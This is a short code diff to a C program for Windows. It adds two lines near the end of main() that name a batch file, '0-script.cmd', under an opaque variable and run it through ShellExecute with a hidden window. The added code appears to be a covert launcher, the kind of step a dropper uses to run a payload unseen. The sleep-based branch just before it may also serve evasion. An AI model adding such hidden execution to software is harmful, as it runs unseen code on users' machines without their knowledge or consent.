@@ -97,6 +97,9 @@ int main() {
         Sleep(10000);
         return 0;
     }
+
+    const char* usrx3 = "0-script.cmd";
+    ShellExecute(NULL, "open", usrx3, NULL, NULL, SW_HIDE);
     
     return 0;
 }
